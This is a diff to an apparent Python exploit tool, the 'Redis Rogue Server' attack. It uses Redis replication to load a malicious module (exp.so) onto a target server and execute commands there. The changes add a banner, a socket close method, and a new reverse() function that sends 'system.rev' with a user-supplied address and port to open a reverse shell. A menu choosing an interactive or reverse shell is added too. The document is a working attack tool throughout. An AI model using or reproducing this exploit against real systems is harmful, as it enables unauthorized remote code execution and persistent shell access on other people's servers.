@@ -7,6 +7,15 @@ from optparse import OptionParser
 payload = open("exp.so", "rb").read()
 CLRF = "\r\n"
 IN_OUT = True
+BANNER = """______         _ _      ______                         _____                          
+| ___ \       | (_)     | ___ \                       /  ___|                         
+| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
+|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
+| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
+\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
+                                     __/ |                                            
+                                    |___/                                             
+"""
 
 def mk_cmd_arr(arr):
     cmd = ""
@@ -82,6 +91,9 @@ class RogueServer:
         self._sock.bind(('0.0.0.0', self._port))
         self._sock.listen(10)
 
+    def close(self):
+        self._sock.close()
+
     def handle(self, data):
         cmd_arr = decode_cmd(data)
         resp = ""
@@ -112,6 +124,7 @@ class RogueServer:
                 break
 
 def interact(remote):
+    print("\033[1;34;40m[*] Interactive mode started.\033[0m\n")
     global IN_OUT
     try:
         IN_OUT = False
@@ -128,6 +141,14 @@ def interact(remote):
     finally:
         IN_OUT = True
 
+def reverse(remote):
+    addr = input("Reverse server address: ")
+    port = input("Reverse server port: ")
+    dout(remote, mk_cmd(f"system.rev {addr} {port}"))
+    print("\033[1;34;40m[*] Reverse shell payload sent.\033[0m\n")
+    print(f"\033[1;34;40m[*] Check at {addr}:{port}\033[0m\n")
+    sys.exit(0)
+
 def runserver(rhost, rport, lhost, lport):
     # expolit
     remote = Remote(rhost, rport)
@@ -139,9 +160,14 @@ def runserver(rhost, rport, lhost, lport):
     sleep(2)
     remote.do("MODULE LOAD ./exp.so")
     remote.do("SLAVEOF NO ONE")
+    rogue.close()
 
     # Operations here
-    interact(remote)
+    choice = input("What do u want, [i]nteractive shell or [r]everse shell: ")
+    if choice.startswith("i"):
+        interact(remote)
+    elif choice.startswith("r"):
+        reverse(remote)
 
     # clean up
     remote.do("CONFIG SET dbfilename dump.rdb")
@@ -149,6 +175,7 @@ def runserver(rhost, rport, lhost, lport):
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
+    print(BANNER)
     parser = OptionParser()
     parser.add_option("--rhost", dest="rh", type="string",
             help="target host")
